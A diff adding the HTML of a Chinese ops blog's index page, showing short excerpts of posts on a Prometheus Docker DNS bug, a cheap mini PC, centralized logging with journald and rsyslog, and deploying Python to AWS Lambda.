+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-06-21 19:27:33" itemprop="dateModified" datetime="2024-06-21T19:27:33+08:00">2024-06-21</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>最近发现了一个 Prometheus 官方 Docker image(<code>https://hub.docker.com/u/prom</code>) 生成的容器不能解析同一个 自定义 bridge 上的其他 Docker 容器的容器名的问题。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/06/Prometheus%20%E5%AE%98%E6%96%B9%20Docker%20image%20%E7%9A%84%E4%B8%80%E4%B8%AA%20bug/index.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://ming.theyan.gs/2024/05/800%20%E5%9D%97%E9%92%B1%E7%9A%84%E5%8A%9E%E5%85%AC%E7%94%B5%E8%84%91/index.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="老杨">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="运维烂笔头">
+      <meta itemprop="description" content="好记性比不过烂笔头">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 运维烂笔头">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/05/800%20%E5%9D%97%E9%92%B1%E7%9A%84%E5%8A%9E%E5%85%AC%E7%94%B5%E8%84%91/index.html" class="post-title-link" itemprop="url">800 块钱的办公电脑</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-05-12 22:32:47" itemprop="dateCreated datePublished" datetime="2024-05-12T22:32:47+08:00">2024-05-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-05-13 19:36:12" itemprop="dateModified" datetime="2024-05-13T19:36:12+08:00">2024-05-13</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="我用-800-块钱买了台办公用的-Mini-PC"><a href="#我用-800-块钱买了台办公用的-Mini-PC" class="headerlink" title="我用 800 块钱买了台办公用的 Mini PC"></a>我用 800 块钱买了台办公用的 Mini PC</h1><p>最近，我花了 800 块钱买了一台 Mini PC，用来办公。刚好这四个月在公司领到的每月 200 块钱电脑补贴，全都花光了。算是“取之于公司，用之于公司”吧，哈哈。</p>
+<p>这次的购买经历不仅让我更深刻地体会到“消费降级”的现实，还让我感受到了科技进步所带来的性价比红利。在预算有限的情况下，这台 Mini PC 不仅完美满足了我的日常需求，还让我对它的未来用途充满期待。接下来，我详细聊聊这次购买的选择过程、使用体验以及相关感悟。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/05/800%20%E5%9D%97%E9%92%B1%E7%9A%84%E5%8A%9E%E5%85%AC%E7%94%B5%E8%84%91/index.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://ming.theyan.gs/2024/04/centralized-logging/index.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="老杨">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="运维烂笔头">
+      <meta itemprop="description" content="好记性比不过烂笔头">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 运维烂笔头">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/04/centralized-logging/index.html" class="post-title-link" itemprop="url">centralized logging on Amazon Linux 2023</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-04-17 20:51:23" itemprop="dateCreated datePublished" datetime="2024-04-17T20:51:23+08:00">2024-04-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-04-21 21:42:35" itemprop="dateModified" datetime="2024-04-21T21:42:35+08:00">2024-04-21</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>最近要做个 log server，把所有服务器的系统日志都收上来。我现在的服务器，操作系统有两种：Amazon Linux 2023 和 Ubuntu，但其实 Ubuntu 又有 22.04 和 24.04 两种，所以，其实是一共有三种操作系统。</p>
+<p>好在这三种系统，其缺省跑的日志应用，Amazon Linux 2023 是 <code>systemd-journald</code>，而 Ubuntu(22.04 和 24.04) 都是既跑有 <code>systemd-journald</code>，又跑的有 <code>rsyslogd</code>。这两种日志应用，都是支持集中的日志服务器的，或者很容易支持。但是为什么不就用一套 <code>rsyslogd</code> 的日志服务器呢？毕竟大家都支持 <code>rsyslogd</code> 的。主要是因为 <code>systemd-journald</code> 相对于 <code>rsyslogd</code> 是很新的东西，所以这里也拿出来练练手。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/04/centralized-logging/index.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://ming.theyan.gs/2024/03/AWS%20%E5%AE%98%E6%96%B9%E7%9A%84%E9%83%A8%E7%BD%B2%20Python%20%E4%BB%A3%E7%A0%81%E5%88%B0%20Lambda%20function%20%E4%B8%8A%E5%8E%BB%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/index.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="老杨">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="运维烂笔头">
+      <meta itemprop="description" content="好记性比不过烂笔头">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 运维烂笔头">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/03/AWS%20%E5%AE%98%E6%96%B9%E7%9A%84%E9%83%A8%E7%BD%B2%20Python%20%E4%BB%A3%E7%A0%81%E5%88%B0%20Lambda%20function%20%E4%B8%8A%E5%8E%BB%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/index.html" class="post-title-link" itemprop="url">AWS 官方的部署 Python 代码到 Lambda function 上去的两种方法</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-03-08 18:24:41" itemprop="dateCreated datePublished" datetime="2024-03-08T18:24:41+08:00">2024-03-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-03-12 23:37:19" itemprop="dateModified" datetime="2024-03-12T23:37:19+08:00">2024-03-12</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>要把 Python 项目部署到 AWS 的 Lambda function，AWS 官方提供了两种方法：<a target="_blank" rel="noopener" href="https://aws.github.io/chalice/">Chalice</a> 和 <a target="_blank" rel="noopener" href="https://aws.amazon.com/serverless/sam/">SAM(AWS Serverless Application Model)</a>，当然，其实比较常用的还有第三方的 serverless。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/03/AWS%20%E5%AE%98%E6%96%B9%E7%9A%84%E9%83%A8%E7%BD%B2%20Python%20%E4%BB%A3%E7%A0%81%E5%88%B0%20Lambda%20function%20%E4%B8%8A%E5%8E%BB%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/index.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://ming.theyan.gs/2024/02/%E6%88%91%E5%81%9A%E7%9A%84%E6%9F%90%E5%85%AC%E5%8F%B8%20SRE%20%E8%81%8C%E4%BD%8D%E7%9A%84%E9%9D%A2%E8%AF%95%E9%A2%98/index.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="老杨">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="运维烂笔头">
+      <meta itemprop="description" content="好记性比不过烂笔头">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 运维烂笔头">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/02/%E6%88%91%E5%81%9A%E7%9A%84%E6%9F%90%E5%85%AC%E5%8F%B8%20SRE%20%E8%81%8C%E4%BD%8D%E7%9A%84%E9%9D%A2%E8%AF%95%E9%A2%98/index.html" class="post-title-link" itemprop="url">我做的某公司 SRE 职位的面试题</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-02-13 23:24:31" itemprop="dateCreated datePublished" datetime="2024-02-13T23:24:31+08:00">2024-02-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-02-15 20:33:47" itemprop="dateModified" datetime="2024-02-15T20:33:47+08:00">2024-02-15</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这是之前有一家公司招 SRE，我投了简历，然后被给了份题让先做一下，于是便有了这篇“水”文。</p>
+<p>当然，最终我并没有拿到这个 offer，最早是说一周内安排面试的，后来又说是这个岗位暂停了。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/02/%E6%88%91%E5%81%9A%E7%9A%84%E6%9F%90%E5%85%AC%E5%8F%B8%20SRE%20%E8%81%8C%E4%BD%8D%E7%9A%84%E9%9D%A2%E8%AF%95%E9%A2%98/index.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">老杨</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
